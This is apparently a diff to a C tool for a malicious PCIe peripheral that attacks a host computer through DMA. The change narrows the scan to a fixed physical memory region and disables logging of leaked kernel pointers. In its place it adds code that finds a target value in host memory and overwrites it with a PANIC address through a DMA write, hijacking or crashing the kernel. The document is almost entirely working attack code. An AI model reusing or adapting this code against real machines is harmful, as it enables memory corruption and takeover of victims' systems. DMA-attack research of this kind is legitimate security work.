@@ -204,7 +204,10 @@ main(int argc, char *argv[])
 	packet_response_state.attack_state = AS_UNINITIALISED;
 	uint64_t read_addr;/* next_read_addr = 0x000000; */
 	/*uint64_t next_read_addr = 0x3b0000000;*/
-	uint64_t next_read_addr = 0x000000;
+	/*uint64_t next_read_addr = 0x000000;*/
+	uint64_t scan_region_base =  0x2000000;
+	uint64_t scan_region_limit = 0x3000000;
+	uint64_t next_read_addr = scan_region_base;
 
 	uint64_t candidate_symbols[32];
 
@@ -212,17 +215,17 @@ main(int argc, char *argv[])
 	atexit(cleanup);
 	signal(SIGINT, signal_cleanup);
 
-	if (argc != 2) {
-		fprintf(stderr, "Usage: %s <output_file>.\n", argv[0]);
-		return 1;
-	}
+	/*if (argc != 2) {*/
+		/*fprintf(stderr, "Usage: %s <output_file>.\n", argv[0]);*/
+		/*return 1;*/
+	/*}*/
 
-	out_file = fopen(argv[1], "w");
-	printf("out_file pointer: %#p.\n", out_file);
-	if (ferror(out_file)) {
-		perror("Error opening dump file");
-		return 2;
-	}
+	/*out_file = fopen(argv[1], "w");*/
+	/*printf("out_file pointer: %#p.\n", out_file);*/
+	/*if (ferror(out_file)) {*/
+		/*perror("Error opening dump file");*/
+		/*return 2;*/
+	/*}*/
 
 	int init = pcie_hardware_init(argc, argv, &physmem);
 	if (init) {
@@ -232,6 +235,8 @@ main(int argc, char *argv[])
 
 	drain_pcie_core();
 	puts("PCIe Core Drained. Let's go.");
+
+	uint64_t panic_addr_host_endian = bswap64(PANIC);
 
 	while (1) {
 		next_tlp(&raw_tlp_in);
@@ -253,9 +258,9 @@ main(int argc, char *argv[])
 			break;
 		case AS_LOOKING_FOR_LEAKED_SYMBOL:
 		   /*if (next_read_addr > 0x500000) {*/
-			if (next_read_addr > 0x8200000) {
-				next_read_addr = 0;
-				fprintf(out_file, "reset\n");
+			if (next_read_addr > scan_region_limit) {
+				next_read_addr = scan_region_base;
+				/*fprintf(out_file, "reset\n");*/
 			}
 			if ((next_read_addr & 0xFFFFFF) == 0) {
 				printf("0x%lx.\n", next_read_addr);
@@ -279,16 +284,22 @@ main(int argc, char *argv[])
 				/*printf("Slide: 0x%lx.\n", candidate_symbols[i] -*/
 				/*0xffffff8000b283c0l);*/
 				/*}*/
-				bool read_symbol = false;
-				if ((candidate_symbols[i] & 0xFFFFFFF000000000) ==
-					                        0xFFFFFF8000000000) {
-					read_symbol = true;
-					fprintf(out_file, "%#16lx: %#16lx\n",
-						read_addr + i * sizeof(uint64_t),
-						candidate_symbols[i]);
-				}
-				if (read_symbol) {
-					putchar('s');
+				/*if ((candidate_symbols[i] & 0xFFFFFFF000000000) ==*/
+											/*0xFFFFFF8000000000) {*/
+					/*read_symbol = true;*/
+					/*fprintf(out_file, "%#16lx: %#16lx\n",*/
+						/*read_addr + i * sizeof(uint64_t),*/
+						/*candidate_symbols[i]);*/
+				/*}*/
+				if (candidate_symbols[i] == INIT) {
+					perform_dma_write(
+						(uint8_t *)&panic_addr_host_endian,
+						sizeof(panic_addr_host_endian),
+						packet_response_state.devfn,
+						0,
+						next_read_addr + i * sizeof(uint64_t));
+					putchar('X');
+					fflush(stdout);
 				}
 			}
 			break;
